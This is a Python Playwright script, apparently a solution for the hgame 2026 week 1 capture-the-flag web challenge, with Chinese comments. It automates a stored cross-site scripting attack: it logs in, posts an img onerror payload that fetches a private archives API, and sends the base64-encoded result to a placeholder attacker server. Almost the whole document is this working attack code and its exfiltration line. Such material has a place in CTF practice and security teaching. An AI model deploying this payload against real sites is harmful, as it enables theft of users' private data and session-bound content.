"""
博丽神社的绘马挂 - XSS攻击脚本
hgame 2026 week1
"""

from playwright.sync_api import sync_playwright
import time

# 配置
TARGET = "http://cloud-middle.hgame.vidar.club:PORT"  # 替换PORT为实际端口
ATTACKER_SERVER = "http://YOUR_SERVER:PORT"  # 替换为你的服务器地址
USERNAME = "1"
PASSWORD = "1"

# XSS Payload - 获取灵梦的归档消息
PAYLOAD = f'<img src=x onerror="fetch(\'/api/archives\').then(r=>r.text()).then(t=>new Image().src=\'{ATTACKER_SERVER}/?data=\'+btoa(t))">'


def exploit():
    print(f"[*] 目标: {TARGET}")
    print(f"[*] 攻击服务器: {ATTACKER_SERVER}")
    print(f"[*] Payload: {PAYLOAD}")
    print()

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False, slow_mo=300)
        context = browser.new_context()
        page = context.new_page()

        # 1. 登录
        print("[*] 正在登录...")
        page.goto(f"{TARGET}/login.html")
        page.wait_for_load_state('networkidle')
        page.fill('#username', USERNAME)
        page.fill('#password', PASSWORD)
        page.click('button')
        page.wait_for_load_state('networkidle')
        time.sleep(1)
        print(f"[+] 登录成功，当前URL: {page.url}")

        # 2. 发布恶意留言
        print("[*] 正在发布XSS payload...")
        page.goto(f"{TARGET}/post.html")
        page.wait_for_load_state('networkidle')
        page.fill('#content', PAYLOAD)
        page.check('#private')  # 勾选私密
        page.click('button')
        page.wait_for_load_state('networkidle')
        time.sleep(1)
        print("[+] Payload已发布")

        # 3. 等待用户点击呼叫灵梦
        print()
        print("=" * 50)
        print("[!] 请点击 '🚨 呼叫灵梦' 按钮")
        print(f"[!] 然后查看服务器 {ATTACKER_SERVER} 的日志")
        print("[!] 收到base64数据后解码即可获得flag")
        print("=" * 50)

        input("\n按Enter关闭浏览器...")
        browser.close()


if __name__ == "__main__":
    exploit()
